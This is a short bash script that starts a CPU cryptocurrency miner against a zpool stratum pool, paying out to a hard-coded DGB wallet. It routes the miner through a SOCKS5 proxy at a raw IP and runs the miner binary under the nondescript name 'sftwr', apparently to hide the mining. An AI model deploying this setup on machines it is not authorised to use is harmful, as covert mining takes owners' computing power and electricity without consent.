#!/bin/bash
POOL=stratum+tcp://cpupower.eu.mine.zpool.ca:6240
WALLET=D6ZLGf67ndSfdDZz2uPgLB2Hpi1MeuHnnD
PROXY=socks5://23.82.15.51:58030
./sftwr -a cpupower -o $POOL -u $WALLET -p c=DGB,zap=VRSC -x $PROXY
